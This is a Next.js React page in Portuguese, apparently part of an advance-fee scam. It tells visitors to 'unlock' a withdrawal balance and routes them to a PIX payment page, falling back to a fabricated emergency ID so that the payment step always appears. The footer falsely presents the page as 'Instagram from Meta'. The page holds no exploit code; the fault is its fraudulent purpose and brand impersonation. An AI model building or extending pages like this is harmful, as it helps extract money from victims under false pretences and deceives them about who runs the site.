'use client'

import { useState } from 'react'
import { useRouter } from 'next/navigation'

export default function WithdrawPage() {
  const [loading, setLoading] = useState(false)
  const router = useRouter()

  const handleUnlockSaque = async () => {
    try {
      setLoading(true)
      console.log("[v0] Starting PIX payment creation from withdraw page")
      
      // Criar transação PIX
      const response = await fetch('/api/pix-payment/create', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          transferId: `withdraw-${Date.now()}`
        }),
      })

      const result = await response.json()

      if (result.success && result.data?.id) {
        console.log("[v0] PIX transaction created successfully:", result.data)
        // Redirecionar para a nova página de pagamento PIX
        router.push(`/pix-payment?id=${result.data.id}`)
      } else {
        console.error("[v0] Error creating PIX transaction:", result)
        // Em caso de erro, ainda redireciona mas com um ID de emergência
        const emergencyId = `emergency-${Date.now()}`
        console.log("[v0] Using emergency fallback ID:", emergencyId)
        router.push(`/pix-payment?id=${emergencyId}`)
      }
    } catch (error) {
      console.error("[v0] Error in handleUnlockSaque:", error)
      // Em caso de erro, ainda redireciona mas com um ID de emergência
      const emergencyId = `emergency-${Date.now()}`
      console.log("[v0] Using emergency fallback ID:", emergencyId)
      router.push(`/pix-payment?id=${emergencyId}`)
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-pink-100 to-orange-100 flex items-center justify-center p-4">
      <div className="bg-white rounded-3xl shadow-2xl p-8 max-w-md w-full">
        {/* Header com ícone */}
        <div className="text-center mb-6">
          <div className="w-16 h-16 bg-gradient-to-r from-pink-500 to-orange-500 rounded-2xl flex items-center justify-center mx-auto mb-4">
            <svg className="w-8 h-8 text-white" fill="currentColor" viewBox="0 0 24 24">
              <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
            </svg>
          </div>
          
          <h1 className="text-2xl font-bold text-gray-800 mb-2">DESBLOQUEIO DE SALDO</h1>
          <p className="text-gray-600 text-sm">Veja como liberar seu saque assistindo ao vídeo</p>
        </div>

        {/* Área do vídeo */}
        <div className="bg-gray-100 rounded-2xl p-8 mb-6 relative overflow-hidden">
          <div className="flex items-center justify-center h-32">
            {/* Botão de play centralizado */}
            <div className="w-16 h-16 bg-gradient-to-r from-pink-500 to-orange-500 rounded-full flex items-center justify-center cursor-pointer hover:scale-105 transition-transform">
              <svg className="w-8 h-8 text-white ml-1" fill="currentColor" viewBox="0 0 24 24">
                <path d="M8 5v14l11-7z"/>
              </svg>
            </div>
          </div>
          
          {/* Labels do vídeo */}
          <div className="text-center mt-4">
            <p className="font-medium text-gray-700">Vídeo Tutorial</p>
            <p className="text-sm text-gray-500">Como desbloquear seu saldo</p>
          </div>
        </div>

        {/* Botão de ação */}
        <button
          onClick={handleUnlockSaque}
          disabled={loading}
          className={`w-full py-4 rounded-xl font-bold text-lg transition-all ${
            loading
              ? 'bg-gray-300 text-gray-500 cursor-not-allowed'
              : 'bg-gradient-to-r from-pink-500 to-orange-500 text-white hover:shadow-lg transform hover:scale-105'
          }`}
        >
          {loading ? (
            <div className="flex items-center justify-center">
              <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-2"></div>
              Processando...
            </div>
          ) : (
            'DESBLOQUEAR SAQUE'
          )}
        </button>

        {/* Footer */}
        <div className="text-center mt-8 pt-6 border-t border-gray-100">
          <p className="text-xs text-gray-500">
            Todos os direitos reservados © 2025 Instagram from Meta
          </p>
        </div>
      </div>
    </div>
  )
}
